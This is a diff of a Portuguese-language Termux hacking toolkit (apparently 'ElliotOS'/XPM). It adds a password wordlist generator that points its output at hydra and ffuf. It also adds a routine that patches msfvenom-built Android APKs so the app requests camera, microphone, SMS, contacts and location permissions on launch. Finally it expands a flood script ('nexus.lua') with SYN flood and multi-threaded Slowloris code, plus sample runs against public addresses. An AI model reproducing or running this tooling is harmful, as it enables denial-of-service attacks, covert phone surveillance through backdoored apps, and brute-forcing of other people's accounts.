+bases = set()
+for p in parts:
+    for v in [p, p.capitalize(), p.upper()]: bases.add(v)
+if len(parts) > 1:
+    sigla = ''.join(x[0] for x in parts if x)
+    for v in [sigla, sigla.upper(), sigla.capitalize()]: bases.add(v)
+full_name = ''.join(parts)
+for v in [full_name, full_name.capitalize()]: bases.add(v)
+
+cy = datetime.now().year
+years = [str(y) for y in range(2000, cy+2)]
+years2 = [y[-2:] for y in years]
+recent_y = years[-6:]; recent_y2 = years2[-6:]
+
+cities = ['sp','rj','bh','df','cwb','poa','rec','for','man','bel',
+          'saopaulo','riodejaneiro','brasilia','curitiba','portoalegre',
+          'recife','fortaleza','manaus','belem','salvador','campinas',
+          'goiania','natal','maceio','teresina','floripa','florianopolis']
+
+suffixes = ['123','1234','12345','321','!','@','#','01','02','10','20',
+            'admin','adm','user','login','pass','senha','master','root',
+            'secret','key','api','dev','prod','test','hom','staging',
+            'backup','tmp','old','new',
+            '2023','2024','2025','2023!','2024!','2025!','@2024','@2025','#1']
+
+prefixes = ['admin','adm','user','login','ftp','ssh','mail','smtp',
+            'vpn','db','backup','test','dev','api','portal','intranet',
+            'srv','ws','app','mobile','web','www','cdn','static']
+
+leet = str.maketrans('aeiostlb','43105718')
+
+for b in bases:
+    words.add(b)
+    words.add(b.lower())
+    words.add(b.lower().translate(leet))
+    for y in recent_y:
+        for sep in ['','_','-','@']:
+            words.add(f"{b.lower()}{sep}{y}")
+            words.add(f"{b}{sep}{y}")
+    for y in recent_y2:
+        words.add(f"{b.lower()}{y}")
+    for s in suffixes:
+        words.add(f"{b.lower()}{s}")
+        words.add(f"{b}{s}")
+    for p in prefixes:
+        words.add(f"{p}{b.lower()}")
+        words.add(f"{p}_{b.lower()}")
+    for c in cities[:10]:
+        words.add(f"{b.lower()}{c}")
+
+if full_mode:
+    if len(parts) >= 2:
+        for p1,p2 in itertools.permutations(parts[:4],2):
+            for sep in ['','_','-']:
+                words.add(f"{p1}{sep}{p2}")
+                words.add(f"{p1}{sep}{p2}123")
+                words.add(f"{p1}{sep}{p2}2024")
+                words.add(f"{p1}{sep}{p2}!")
+    for b in list(bases)[:5]:
+        for y in recent_y:
+            words.add(f"{b.lower().translate(leet)}{y}")
+        for s in suffixes[:15]:
+            words.add(f"{b.lower().translate(leet)}{s}")
+    for c in cities:
+        for b in list(bases)[:3]:
+            words.add(f"{b.lower()}{c}")
+            words.add(f"{c}{b.lower()}")
+
+words = {w for w in words if min_len <= len(w) <= max_len and w.strip()}
+word_list = sorted(words)
+
+print(f"  \033[1;32m✓ {len(word_list)} palavras geradas\033[0m")
+
+if out_file:
+    with open(out_file,'w') as f:
+        f.write('\n'.join(word_list)+'\n')
+    print(f"  \033[1;32m✓ Salvo em: {out_file}\033[0m")
+    print(f"  \033[0;90m→ ffuf  -u https://alvo.com/FUZZ -w {out_file}\033[0m")
+    print(f"  \033[0;90m→ gobuster dir -u https://alvo.com -w {out_file}\033[0m")
+    print(f"  \033[0;90m→ hydra ... -P {out_file}\033[0m")
+else:
+    for w in word_list: print(w)
+print()
+WORDMAGIC_EOF
+
+    chmod +x "$BIN"
+    _ok "wordmagic instalado em $BIN"
+    printf "\n  \033[1;33mUso:\033[0m wordmagic empresa.com [-o words.txt] [--full]\n\n"
 }
 
 cmd_install() {
@@ -95461,12 +96148,25 @@ _remove_one() {
             pkg remove -y apktool 2>/dev/null || true
             ;;
         apkfull)
+            # pkg packages
+            pkg remove -y apksigner aapt aapt2 apkeep apkeditor 2>/dev/null || true
+            # wrapper anti-idsig: remove o apksigner.real residual
+            rm -f  "${PREFIX:-/data/data/com.termux/files/usr}/bin/apksigner.real" 2>/dev/null || true
+            # apkeditor via tur-repo ou JAR manual
+            rm -f  "${PREFIX:-/data/data/com.termux/files/usr}/bin/apkeditor" 2>/dev/null || true
+            rm -rf "$HOME/.xpm/tools/apkeditor" 2>/dev/null || true
+            # web2apk
+            rm -f  "${PREFIX:-/data/data/com.termux/files/usr}/bin/web2apk" 2>/dev/null || true
+            rm -rf "$HOME/.xpm/tools/web2apk" 2>/dev/null || true
+            # apkinspect
+            rm -f  "${PREFIX:-/data/data/com.termux/files/usr}/bin/apkinspect" 2>/dev/null || true
+            # keystore de teste
             rm -rf "$HOME/.xpm/tools/apktool" 2>/dev/null || true
-            pkg remove -y apktool apksigner aapt aapt2 apkeep 2>/dev/null || true
-            rm -f "$HOME/.local/bin/apktool" 2>/dev/null || true
             ;;
         apkeditor)
             pkg remove -y apkeditor 2>/dev/null || true
+            rm -f  "${PREFIX:-/data/data/com.termux/files/usr}/bin/apkeditor" 2>/dev/null || true
+            rm -rf "$HOME/.xpm/tools/apkeditor" 2>/dev/null || true
             ;;
     esac
 
@@ -95606,7 +96306,9 @@ cmd_list() {
         local cat desc
         cat=$(  _db_get "$n" category  2>/dev/null || echo "?")
         desc=$( _db_get "$n" description 2>/dev/null || echo "")
-        printf "  ${G}%-20s${R} ${DIM}%-22s${R} %s\n" "$n" "[$cat]" "$desc"
+        local eo_mark=""
+        grep -q "^builtin=yes" "$XPM_DB/${n}.tool" 2>/dev/null && eo_mark=" ${M}[★ ElliotOS]${R}"
+        printf "  ${G}%-20s${R} ${DIM}%-22s${R} %s%s\n" "$n" "[$cat]" "$desc" "$eo_mark"
         count=$((count+1))
     done
     [ "$count" -eq 0 ] && _warn "Nenhuma ferramenta instalada ainda."
@@ -95631,11 +96333,12 @@ cmd_search() {
                 printf "\n  ${Y}── %s ──${R}\n" "$cat"
                 cur_cat="$cat"
             fi
-            local inst_mark="" tok_color="$G"
+            local inst_mark="" tok_color="$G" eo_mark=""
             _is_installed "$n" && inst_mark=" ${G}[instalado]${R}"
             [ "$tok" = "no" ] && tok_color="$E"
             [ "$tok" = "partial" ] && tok_color="$Y"
-            printf "  ${W}%-16s${R} %s%s\n" "$n" "$desc" "$inst_mark"
+            grep -q "^builtin=yes" "$f" 2>/dev/null && eo_mark=" ${M}[★ ElliotOS]${R}"
+            printf "  ${W}%-16s${R} %s%s%s\n" "$n" "$desc" "$eo_mark" "$inst_mark"
             count=$((count+1))
         done
         printf "\n  ${DIM}Total: %d ferramentas disponíveis no XPM${R}\n" "$count"
@@ -95655,13 +96358,14 @@ cmd_search() {
             cat=$(  grep "^category="   "$f" | cut -d= -f2-)
             desc=$( grep "^description=" "$f" | cut -d= -f2-)
             tok=$(  grep "^termux_ok="  "$f" | cut -d= -f2-)
-            local inst_mark=""
+            local inst_mark="" eo_mark=""
             _is_installed "$n" && inst_mark="${G}[instalado]${R} "
             local tok_color="$G"
             [ "$tok" = "no" ] && tok_color="$E"
             [ "$tok" = "partial" ] && tok_color="$Y"
+            grep -q "^builtin=yes" "$f" 2>/dev/null && eo_mark="  ${M}★ ElliotOS-exclusive${R}"
             printf "  ${W}%-20s${R} ${DIM}[%s]${R} %s\n" "$n" "$cat" "$desc"
-            printf "    %sTermux: %s${R}  %s\n" "$tok_color" "$tok" "$inst_mark"
+            printf "    %sTermux: %s${R}  %s%s\n" "$tok_color" "$tok" "$inst_mark" "$eo_mark"
             count=$((count+1))
         fi
     done
@@ -95958,6 +96662,162 @@ _ae_normalize_smali() {
     done
 }
 
+# MSF_AE_RUNTIME_PERMS_V1 — cria MsfPermActivity dedicada para pedir permissoes
+# Solucao universal: nao toca smali existente, injeta nova Activity como LAUNCHER
+# Ela pede as permissoes em runtime (Android 6+) e depois inicia a Activity original
+_ae_inject_runtime_perms() {
+    local _dir="$1"
+    [ -f "$_dir/AndroidManifest.xml" ] || return 0
+    [ -n "${BUNDLE_GEMFILE:-}" ]        || return 0  # so no contexto msfvenom
+    command -v python3 >/dev/null 2>&1  || return 0
+    python3 - "$_dir" << 'AERPEOF'
+import sys, os, re
+import xml.etree.ElementTree as ET
+
+work = sys.argv[1]
+manifest_path = os.path.join(work, 'AndroidManifest.xml')
+if not os.path.exists(manifest_path):
+    sys.exit(0)
+
+with open(manifest_path) as f:
+    mxml = f.read()
+if 'MsfPermActivity' in mxml:
+    sys.exit(0)  # idempotente
+
+NS = 'http://schemas.android.com/apk/res/android'
+try:
+    tree = ET.parse(manifest_path)
+    root = tree.getroot()
+    pkg  = root.get('package', '')
+except Exception:
+    sys.exit(0)
+
+PERMS_ALL = [
+    'android.permission.READ_EXTERNAL_STORAGE',
+    'android.permission.WRITE_EXTERNAL_STORAGE',
+    'android.permission.RECORD_AUDIO',
+    'android.permission.CAMERA',
+    'android.permission.ACCESS_FINE_LOCATION',
+    'android.permission.ACCESS_COARSE_LOCATION',
+    'android.permission.READ_CONTACTS',
+    'android.permission.READ_CALL_LOG',
+    'android.permission.READ_SMS',
+    'android.permission.PROCESS_OUTGOING_CALLS',
+    'android.permission.RECEIVE_SMS',
+    'android.permission.GET_ACCOUNTS',
+]
+
+declared = set()
+for p in root.iter('uses-permission'):
+    name = p.get(f'{{{NS}}}name') or p.get('android:name', '')
+    if name:
+        declared.add(name)
+perms = [p for p in PERMS_ALL if p in declared]
+if not perms:
+    sys.exit(0)
+
+# Encontra o launcher Activity original
+launcher = None
+for act in root.iter('activity'):
+    aname = act.get(f'{{{NS}}}name') or act.get('android:name', '')
+    if not aname:
+        continue
+    if aname.startswith('.'):
+        aname = pkg + aname
+    has_m = has_l = False
+    for filt in act.iter('intent-filter'):
+        for a in filt.iter('action'):
+            v = a.get(f'{{{NS}}}name') or a.get('android:name', '')
+            if 'MAIN' in v:
+                has_m = True
+        for c in filt.iter('category'):
+            v = c.get(f'{{{NS}}}name') or c.get('android:name', '')
+            if 'LAUNCHER' in v:
+                has_l = True
+    if has_m and has_l:
+        launcher = aname
+        break
+
+if not launcher:
+    sys.exit(0)
+
+orig_ref  = 'L' + launcher.replace('.', '/') + ';'
+n         = len(perms)
+
+# Constroi o array de permissoes em Smali
+arr = []
+for i, p in enumerate(perms):
+    ri = f'const/4 v1, 0x{i:x}' if i < 8 else f'const/16 v1, 0x{i:x}'
+    arr += [f'    {ri}', f'    const-string v2, "{p}"', '    aput-object v2, v0, v1', '']
+arr_smali = '\n'.join(arr).rstrip()
+
+# Smali da MsfPermActivity — pede permissoes e inicia a Activity original
+smali_content = f'''.class public Lcom/metasploit/msfperm/MsfPermActivity;
+.super Landroid/app/Activity;
+# MSF_AE_RUNTIME_PERMS_V1
+
+.method public constructor <init>()V
+    .registers 1
+    invoke-direct {{p0}}, Landroid/app/Activity;-><init>()V
+    return-void
+.end method
+
+.method protected onCreate(Landroid/os/Bundle;)V
+    .registers 5
+    invoke-super {{p0, p1}}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
+    const/16 v0, 0x{n:x}
+    new-array v0, v0, [Ljava/lang/String;
+
+{arr_smali}
+
+    const/16 v1, 0x1337
+    invoke-virtual {{p0, v0, v1}}, Landroid/app/Activity;->requestPermissions([Ljava/lang/String;I)V
+    return-void
+.end method
+
+.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
+    .registers 6
+    invoke-super {{p0, p1, p2, p3}}, Landroid/app/Activity;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V
+    new-instance v0, Landroid/content/Intent;
+    const-class v1, {orig_ref}
+    invoke-direct {{v0, p0, v1}}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+    invoke-virtual {{p0, v0}}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V
+    invoke-virtual {{p0}}, Landroid/app/Activity;->finish()V
+    return-void
+.end method
+'''
+
+# Encontra o diretorio smali/classes (estrutura APKEditor)
+smali_root = os.path.join(work, 'smali')
+if not os.path.exists(smali_root):
+    sys.exit(0)
+cdirs = sorted([d for d in os.listdir(smali_root) if d.startswith('classes')])
+base  = os.path.join(smali_root, cdirs[0]) if cdirs else smali_root
+
+perm_dir = os.path.join(base, 'com', 'metasploit', 'msfperm')
+os.makedirs(perm_dir, exist_ok=True)
+with open(os.path.join(perm_dir, 'MsfPermActivity.smali'), 'w') as f:
+    f.write(smali_content)
+
+# Patcha o manifest: remove MAIN+LAUNCHER do original, adiciona MsfPermActivity
+mxml = re.sub(r'<action\s[^>]*\.MAIN[^>]*/>', '', mxml)
+mxml = re.sub(r'<category\s[^>]*\.LAUNCHER[^>]*/>', '', mxml)
+new_act = (
+    '\n        <activity android:name="com.metasploit.msfperm.MsfPermActivity"'
+    ' android:exported="true">\n'
+    '            <intent-filter>\n'
+    '                <action android:name="android.intent.action.MAIN"/>\n'
+    '                <category android:name="android.intent.category.LAUNCHER"/>\n'
+    '            </intent-filter>\n'
+    '        </activity>'
+)
+mxml = mxml.replace('</application>', new_act + '\n    </application>', 1)
+with open(manifest_path, 'w') as f:
+    f.write(mxml)
+print('[xpm] MsfPermActivity injetada — dialogo de permissoes ativo ao abrir o app')
+AERPEOF
+}
+
 case "${1:-}" in
 
   -version|--version|-v)
@@ -96029,6 +96889,7 @@ case "${1:-}" in
         # Remove dirs v24+ — framework android-23 nao os suporta (patch cirurgico usa resources do APK original)
         find "$_input/resources" -type d \( -name '*-v2[4-9]' -o -name '*-v[3-9][0-9]' \) \
             -exec rm -rf {} + 2>/dev/null; true
+        _ae_inject_runtime_perms "$_input"
         "$_AE" b -i "$_input" -o "$_ae_tmp"; _rc=$?
         # Fallback iterativo: trata erros de resource e de atributos do manifest
         # sem esvaziar resources nem raspar o manifest inteiro
@@ -97002,7 +97863,7 @@ printf "  \033[1;32mms --env \033[0;33m[VAR]\033[0m             — variaveis de
 printf "\033[1;33m── Aprender / Exemplos ─────────────────────────────────────────\033[0m\n"
 printf "  \033[1;32mms --learn\033[0m                   — tutorial interativo em português\n"
 printf "  \033[1;32mms --examples\033[0m                — lista scripts de exemplo prontos\n"
-printf "  \033[0;90m  Scripts: recon, portscan, webcheck, hashcrack, cosmic\033[0m\n\n"
+printf "  \033[0;90m  Scripts: recon, portscan, webcheck, hashcrack, nexus\033[0m\n\n"
 
 printf "\033[1;33m── Scripts ─────────────────────────────────────────────────────\033[0m\n"
 printf "  \033[1;32mms --script \033[0;33m<nome>\033[0m            — executa script Lua ou C do diretorio de scripts\n"
@@ -97010,7 +97871,7 @@ printf "  \033[1;32mms --script \033[0;33m<nome> -- [args]\033[0m  — com argum
 printf "  \033[0;90m  Lua: ${PREFIX:-/usr/local}/share/lua-scripts\033[0m\n"
 printf "  \033[0;90m  C:   ${PREFIX:-/usr/local}/share/c-scripts  (fontes .c compilam automaticamente)\033[0m\n"
 printf "  \033[0;90m  Exemplos:\033[0m\n"
-printf "  \033[0;90m    ms --script cosmic.lua -- --os 8.8.8.8\033[0m\n"
+printf "  \033[0;90m    ms --script nexus --os 8.8.8.8\033[0m\n"
 printf "  \033[0;90m    ms --script portscan.lua -- 192.168.1.1 80 443\033[0m\n"
 printf "  \033[0;90m    ms --script xerxes.c -- 192.168.1.1 80\033[0m\n\n"
 printf "  \033[1;32mms --cscript \033[0;33m<nome.c>\033[0m         — compila e executa script C de c-scripts\n"
@@ -100775,7 +101636,7 @@ local function exemplos()
         {"portscan.lua", "Port scanner rápido com threads"},
         {"webcheck.lua", "Verifica headers de segurança de um site"},
         {"hashcrack.lua","Compara hash com wordlist"},
-        {"cosmic.lua",   "Flood UDP/TCP/HTTP/Slowloris"},
+        {"nexus.lua",   "Flood UDP/TCP/HTTP/Slowloris"},
     }
     for _, s in ipairs(scripts) do
         print(string.format("  %s%-14s%s %s", C.cmd, s[1], C.reset, C.dim..s[2]..C.reset))
@@ -101275,10 +102136,10 @@ HASHEOF
     chmod 755 "$_EX_DIR/hashcrack.lua"
     _ok "hashcrack.lua instalado"
 
-    # ── cosmic.lua — framework de testes de rede ──────────────────────────────
-    cat > "$_EX_DIR/cosmic.lua" << 'COSMICEOF'
+    # ── nexus.lua — framework de testes de rede ──────────────────────────────
+    cat > "$_EX_DIR/nexus.lua" << 'NEXUSEOF'
 #!/usr/bin/env ms
--- cosmic.lua — ElliotOS Edition (cosmic + slowcosmo integrados)
+-- nexus.lua — ElliotOS Edition (nexus + slownexus integrados)
 
 local YEL  = '\027[93m'
 local BLU  = '\027[0;94m'
@@ -101299,7 +102160,7 @@ local function pb_draw(sent)
     local frac=pb_total>0 and math.min(sent/pb_total,1.0) or 0
     local done=math.floor(30*frac)
     local bar=BLU.."["..string.rep("█",done)..string.rep("-",30-done).."]"..RST
-    local line=string.format("\r%s %5.1f%% | Pacotes-Cosmicos: %s%d/%d%s",
+    local line=string.format("\r%s %5.1f%% | Pacotes-Nexus: %s%d/%d%s",
         bar,frac*100,GRN,sent,pb_total,RST)
     if #line<pb_last then line=line..string.rep(" ",pb_last-#line) end
     pb_last=#line; io.write(line); io.flush()
@@ -101307,7 +102168,7 @@ end
 
 local function pb_finish(sent)
     sent=sent or pb_total
-    local line=string.format("\r%s[%s]%s 100.0%% | Pacotes-Cosmicos: %s%d/%d%s\n",
+    local line=string.format("\r%s[%s]%s 100.0%% | Pacotes-Nexus: %s%d/%d%s\n",
         BLU,string.rep("█",30),RST,GRN,sent,pb_total,RST)
     if #line<pb_last then line=line..string.rep(" ",pb_last-#line) end
     io.write(line); io.flush()
@@ -101441,7 +102302,7 @@ local function icmp_flood(ip,pkt_per_thread,n_threads,pkt_size)
     pb_init(total); pb_draw(0)
     local est_sec = math.max(1, total / 500)
     local step_ms = 80
-    local tmpfile = "/data/data/com.termux/files/home/.cosmic_icmp_tmp"
+    local tmpfile = "/data/data/com.termux/files/home/.nexus_icmp_tmp"
     sh.exec(string.format(
         "ping -c %d -f -q -s %d %s > %s 2>&1 &",
         total, pkt_size, ip, tmpfile))
@@ -101459,16 +102320,19 @@ local function icmp_flood(ip,pkt_per_thread,n_threads,pkt_size)
     pb_finish(sent)
 end
 
-local function psyn_flood(ip,port,pkt_per_thread,n_threads,pkt_size)
+local function syn_flood(ip,port,pkt_per_thread,n_threads)
+    -- SYN flood: timeout=0 → select() retorna imediatamente após connect()
+    -- O SYN já foi enviado pelo kernel no connect() não-bloqueante.
+    -- close() com SO_LINGER{1,0} manda RST e libera o fd na hora.
+    -- Sem esperar SYN-ACK ou RST do alvo — máxima taxa de envio.
     local code=string.format([[
-local p=string.rep("A",%d)
 local sent=0
 for _=1,%d do
-    local s=net.tcp(%q,%d,1)
-    if s then pcall(function()s:send(p)end);pcall(function()s:close()end);sent=sent+1 end
+    local ok=pcall(net.socket,"ipv4","syn",%q,%d,0)
+    if ok then sent=sent+1 end
 end
 return sent
-]], pkt_size,pkt_per_thread,ip,port)
+]], pkt_per_thread,ip,port)
     return launch_and_collect(code,n_threads,pkt_per_thread*n_threads)
 end
 
@@ -101489,76 +102353,97 @@ local UA_BLOCK = [[
 local SLOW_TMPL = [[
 math.randomseed(os.time()+os.clock()*1e9)
 local ip=IP_VAL; local port=PORT_VAL; local sleep_ms=SLEEP_VAL
-local rand_ua=RANDUA_VAL; local uid=UID_VAL
+local n_per=N_PER_VAL; local rand_ua=RANDUA_VAL; local uid=UID_VAL
 local uas={UA_LIST}
 local function sr(s,d) return pcall(function()s:send(d)end) end
-local function open()
+local function open_sock(idx)
     local s=net.tcp(ip,port,4); if not s then return nil end
-    local ua=rand_ua and uas[math.random(#uas)] or uas[(uid%#uas)+1]
-    sr(s,"GET /?"..(math.random(9999)).." HTTP/1.1\r\n")
+    local ua=rand_ua and uas[math.random(#uas)] or uas[((idx+uid)%#uas)+1]
+    sr(s,"GET /?"..math.random(9999).." HTTP/1.1\r\n")
     sr(s,"Host: "..ip.."\r\n")
     sr(s,"User-Agent: "..ua.."\r\n")
     sr(s,"Accept-language: en-US,en,q=0.5\r\n")
     return s
 end
-local sock=open(); if not sock then return 0 end
-local kept=0
-while true do
-    local ok=sr(sock,"X-a: "..math.random(5000).."\r\n")
-    if not ok then
-        pcall(function()sock:close()end)
-        sock=open(); if not sock then break end
-    end
-    kept=kept+1
-    sys.sleep(sleep_ms)
+-- cada thread abre e mantém n_per sockets independentes
+local socks={}
+for i=1,n_per do
+    local s=open_sock(i)
+    if s then socks[#socks+1]=s end
+    if i%20==0 then sys.sleep(20) end
 end
-return kept
+while true do
+    sys.sleep(sleep_ms)
+    local live={}
+    for _,s in ipairs(socks) do
+        local ok=sr(s,"X-a: "..math.random(9999).."\r\n")
+        if ok then live[#live+1]=s
+        else
+            pcall(function()s:close()end)
+            local ns=open_sock(math.random(9999))
+            if ns then live[#live+1]=ns end
+        end
+    end
+    socks=live
+end
+return #socks
 ]]
 
-local function slow_cosmo(ip,port,n_sockets,sleep_sec,rand_ua,verbose)
+local function slow_cosmo(ip,port,n_sockets,sleep_sec,rand_ua,verbose,n_threads)
     if not ip or ip=="" then
         io.stderr:write(RED.."[SLOWCOSMO] Erro: IP nao informado.\n"..RST); return
     end
     if not port or port<=0 or port>65535 then
         io.stderr:write(RED.."[SLOWCOSMO] Erro: porta invalida.\n"..RST); return
     end
-    n_sockets = math.max(1, n_sockets or 100)
-    sleep_sec = math.max(1, sleep_sec or 15)
+    n_sockets = math.max(1,  n_sockets  or 200)
+    sleep_sec = math.max(1,  sleep_sec  or 15)
+    -- cap de 48 threads (limite seguro do sys.thread no Termux/Android)
+    -- cada thread gerencia ceil(n_sockets/n_threads) conexoes simultaneas
+    n_threads = math.min(math.max(1, n_threads or 32), 48)
+    local n_per    = math.ceil(n_sockets / n_threads)
     local sleep_ms = sleep_sec * 1000
     io.write("\n")
-    print(string.format("%s%s[SLOWCOSMO]%s Alvo: %s%s%s | Porta: %d | Sockets: %d | Keep-alive: %ds",
-        YEL,BOLD,RST,BOLD,ip,RST,port,n_sockets,sleep_sec))
+    print(string.format(
+        "%s%s[SLOWCOSMO]%s Alvo: %s%s%s | Porta: %d | Sockets: %d | Threads: %d | Sockets/thread: %d | Keep-alive: %ds",
+        YEL,BOLD,RST,BOLD,ip,RST,port,n_sockets,n_threads,n_per,sleep_sec))
     print(string.format("%s[*]%s Abrindo conexoes lentas... Ctrl+C para parar\n",BLU,RST))
     local tids={}; local launched=0
-    for i=1,n_sockets do
+    for i=1,n_threads do
         local code = SLOW_TMPL
             :gsub("IP_VAL",    string.format("%q", ip))
             :gsub("PORT_VAL",  tostring(port))
             :gsub("SLEEP_VAL", tostring(sleep_ms))
+            :gsub("N_PER_VAL", tostring(n_per))
             :gsub("RANDUA_VAL",rand_ua and "true" or "false")
             :gsub("UID_VAL",   tostring(i))
             :gsub("UA_LIST",   UA_BLOCK)
         local ok, tid = pcall(sys.thread, code)
-        if ok and tid and tid > 0 then tids[#tids+1]=tid; launched=launched+1 end
-        sys.sleep(30)
+        if ok and tid and tid>0 then tids[#tids+1]=tid; launched=launched+1 end
+        sys.sleep(20)
         if verbose then
-            io.write(string.format("\r%s[+]%s Abrindo... %s%d/%d%s",GRN,RST,GRN,launched,n_sockets,RST))
+            local est = math.min(launched*n_per, n_sockets)
+            io.write(string.format("\r%s[+]%s Threads: %s%d/%d%s  (~%d sockets)",
+                GRN,RST,GRN,launched,n_threads,RST,est))
             io.flush()
         end
     end
     if launched==0 then
-        io.stderr:write(RED.."[SLOWCOSMO] Nenhum socket abriu. Verifique o alvo.\n"..RST); return
+        io.stderr:write(RED.."[SLOWCOSMO] Nenhuma thread abriu. Verifique o alvo.\n"..RST); return
     end
-    io.write(string.format("\r%s[✓]%s %d sockets ativos. Mantendo vivos...\n\n",GRN,RST,launched))
+    local est_total = launched*n_per
+    io.write(string.format("\r%s[✓]%s %d threads ativas (~%d sockets). Mantendo vivos...\n\n",
+        GRN,RST,launched,est_total))
     local t0=sys.time(); local cycles=0
     while true do
         sys.sleep(sleep_ms); cycles=cycles+1
         io.write(string.format(
-            "\r%s[SLOWCOSMO]%s sockets: %s%d%s | keep-alives: %s%d%s | tempo: %s%.0fs%s   ",
-            YEL,RST,GRN,launched,RST,BLU,cycles,RST,YEL,sys.time()-t0,RST))
+            "\r%s[SLOWCOSMO]%s threads: %s%d%s | ~sockets: %s%d%s | keep-alives: %s%d%s | tempo: %s%.0fs%s   ",
+            YEL,RST,GRN,launched,RST,GRN,est_total,RST,BLU,cycles,RST,YEL,sys.time()-t0,RST))
         io.flush()
     end
 end
+
 
 -- ── RECON ─────────────────────────────────────────────────────────────────────
 local function tfp_scan(ip,ports,quiet)
@@ -101681,7 +102566,7 @@ end
 -- recon completo: ping + dns + os + tfp + banner HTTP
 local function full_recon(ip, ports, quiet)
     print("\n"..YEL..BOLD.."╔══════════════════════════════════════════╗")
-    local lbl=ip:sub(1,28); print("║  COSMIC RECON — "..lbl..string.rep(" ",max(0,23-#lbl)).."║")
+    local lbl=ip:sub(1,28); print("║  NEXUS RECON — "..lbl..string.rep(" ",max(0,23-#lbl)).."║")
     print("╚══════════════════════════════════════════╝"..RST.."\n")
 
     -- ping
@@ -101726,43 +102611,48 @@ end
 
 local function usage()
     banner()
-    print(GRN..BOLD.."Uso: ms cosmic.lua <modo> <ip> [ip2 ip3 ...] [opcoes]"..RST)
+    print(GRN..BOLD.."Uso: ms --script nexus <modo> <ip> [ip2 ip3 ...] [opcoes]"..RST)
     print(DIM.."  Exemplo do que o ElliotOS consegue fazer — 100% Lua + C + Bash, sem Python."..RST)
     print(YEL..BOLD.."\n── Flood ───────────────────────────────────────────────────"..RST)
-    for _,m in ipairs({{"--udp","UDP flood"},{"--tcp","TCP flood"},{"--http","HTTP flood"},{"--icmp","ICMP flood"},{"--psyn","Pseudo-SYN"}}) do
+    for _,m in ipairs({{"--udp","UDP flood"},{"--tcp","TCP flood"},{"--http","HTTP flood"},{"--icmp","ICMP flood"},{"--syn","SYN flood (connect nao-bloqueante + RST imediato)"}}) do
         print(string.format("  %s%-8s%s %s",GRN,m[1],RST,m[2]))
     end
     print(YEL..BOLD.."\n── Slowloris ────────────────────────────────────────────────"..RST)
     print(string.format("  %s--slow%s    Conexoes TCP persistentes — esgota workers HTTP",GRN,RST))
     print(YEL..BOLD.."\n── Recon (suporta multiplos hosts) ─────────────────────────"..RST)
     print(string.format("  %s--recon%s   Recon completo: ping + DNS + OS + TFP",GRN,RST))
-    print(string.format("  %s--tfp%s     Testa UDP/TCP/HTTP/ICMP/GHOSTSYN por porta",GRN,RST))
-    print(string.format("  %s--os%s      Detecta SO (usa net.os se disponivel)",GRN,RST))
+    print(string.format("  %s--tfp%s     Testa UDP/TCP por porta",GRN,RST))
+    print(string.format("  %s--os%s      Detecta SO via TTL + portas",GRN,RST))
     print(string.format("  %s--dns%s     Resolve DNS — aceita varios hosts",GRN,RST))
     print(string.format("  %s--ping%s    Ping com RTT — aceita varios hosts",GRN,RST))
-    print(string.format("  %s--hosts%s   Descobre hosts ativos na rede local (net.ip)",GRN,RST))
+    print(string.format("  %s--scan%s    SYN port scan de alta velocidade (batch 512) — igual ao net.scan",GRN,RST))
+    print(string.format("  %s--hosts%s   Descobre hosts ativos na rede local (SYN probe)",GRN,RST))
     print(YEL..BOLD.."\n── Opcoes ───────────────────────────────────────────────────"..RST)
     for _,o in ipairs({{"-p <porta>","Porta(s)","80"},{"-s <n>","Pacotes/sockets","100"},{"-t <n>","Threads","10"},{"-x <tam>","Payload (B/KB/MB/GB)","1KB"},{"-st <s>","Keep-alive (slow)","15"},{"-ua","UAs aleatorios",""},{"-v","Verbose",""}}) do
         local def=o[3]~="" and (" "..BLU.."(padrao: "..o[3]..")"..RST) or ""
         print(string.format("  %s%-12s%s %s%s",GRN,o[1],RST,o[2],def))
     end
     print(YEL..BOLD.."\n── Limitações técnicas (sem root) ──────────────────────────"..RST)
-    print(string.format("  %sTCP CONNECT%s  Nao e SYN scan — aparece nos logs do servidor",DIM,RST))
+    print(string.format("  %sTCP CONNECT%s  Aparece nos logs do servidor (--tfp usa isso)",DIM,RST))
     print(string.format("  %sUDP%s          Sem ICMP: resultado e open|filtered, nunca certeza",DIM,RST))
     print(string.format("  %sICMP%s         Usa ping shell — sujeito a rate limiting do Android",DIM,RST))
-    print(string.format("  %sTCPCONN%s      Substitui GHOSTSYN — nunca foi SYN real",DIM,RST))
+
     print(YEL..BOLD.."\n── Exemplos ─────────────────────────────────────────────────"..RST)
     for _,e in ipairs({
-        "ms cosmic.lua --dns google.com youtube.com github.com",
-        "ms cosmic.lua --ping 8.8.8.8 1.1.1.1 192.168.101.1",
-        "ms cosmic.lua --recon 192.168.101.1 -p 22,80,443",
-        "ms cosmic.lua --os 8.8.8.8 1.1.1.1",
-        "ms cosmic.lua --tfp 192.168.1.1 -p 22,80,443",
-        "ms cosmic.lua --udp 1.1.1.1 -p 53 -s 500 -t 16 -x 512",
-        "ms cosmic.lua --tcp 1.1.1.1 -p 80 -s 100 -t 8 -x 1KB",
-        "ms cosmic.lua --http 1.1.1.1 -p 80 -s 50 -t 4 -x 76KB",
-        "ms cosmic.lua --slow 192.168.1.1 -p 80 -s 200 -st 10 -ua",
-        "ms cosmic.lua --hosts",
+        "ms --script nexus --dns google.com youtube.com github.com",
+        "ms --script nexus --ping 8.8.8.8 1.1.1.1 192.168.101.1",
+        "ms --script nexus --recon 192.168.101.1 -p 22,80,443",
+        "ms --script nexus --os 8.8.8.8 1.1.1.1",
+        "ms --script nexus --tfp 192.168.1.1 -p 22,80,443",
+        "ms --script nexus --udp 1.1.1.1 -p 53 -s 500 -t 16 -x 512",
+        "ms --script nexus --tcp 1.1.1.1 -p 80 -s 100 -t 8 -x 1KB",
+        "ms --script nexus --http 1.1.1.1 -p 80 -s 50 -t 4 -x 76KB",
+        "ms --script nexus --slow 192.168.1.1 -p 80 -s 200 -st 10 -ua",
+        "ms --script nexus --hosts",
+        "ms --script nexus --scan 192.168.1.1 -p 1-9999",
+        "ms --script nexus --scan 192.168.101.1 -p 1-65535",
+        "ms --script nexus --syn 192.168.1.1 -p 80 -s 1000 -t 16",
+        "ms --script nexus --syn 10.0.0.1 -p 443 -s 5000 -t 32",
     }) do print("  "..BLU..e..RST) end
     print(""); os.exit(0)
 end
